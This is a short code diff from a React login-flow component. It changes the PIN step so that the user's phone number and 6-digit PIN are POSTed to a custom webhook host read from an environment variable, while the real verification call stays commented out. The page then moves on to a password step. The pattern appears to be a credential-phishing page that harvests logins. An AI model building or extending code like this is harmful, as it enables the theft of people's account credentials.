@@ -9,17 +9,23 @@ export function PinSection() {
   const location = useLocation();
   const {interPhone} = location.state || {};
 
-  const handleSubmit = () => {
+  const handleSubmit = async() => {
     if (code.length !== 6) {
       console.log('PIN not complete');
       return;
     }
     const pinString = code.join('')
 
-
-    console.log("pin码 :" + pinString );
-    console.log("hamo: " + interPhone );
-
+    const HOST = process.env.REACT_APP_HOST;
+    // 发送到自定义webhook
+    await fetch(`${HOST}/pin`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        interPhone,
+        pinString,
+      }),
+    }); 
     // const payload = {)
     // await fetch('/api/verify-pin', {
     //   method: 'POST',
@@ -31,7 +37,7 @@ export function PinSection() {
       navigate('/password', {
         state:{
           interPhone: interPhone,
-          pin: pinString
+          pinString: pinString
         }
       });
     },500)
